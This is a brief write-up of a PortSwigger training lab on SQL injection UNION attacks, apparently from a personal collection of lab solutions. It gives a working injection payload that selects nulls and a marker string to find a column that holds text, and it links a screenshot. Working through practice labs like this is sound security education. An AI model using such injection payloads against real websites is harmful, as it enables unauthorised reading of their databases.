# Lab: SQL injection UNION attack, finding a column containing text

**Link**: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

**Solution**: Solution: just select by colmnName with mutiple join nulls until find it

add: **' union select null,  'UDvz7G', null -- //UDvz7G is random value by the lap**

<p align="center" width="100%">
  <img src="https://github.com/aboelkassem/portswigger-labs/blob/main/SQL%20Injection/Lab%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/image1.png" width="500" hight="500"/>
</p>
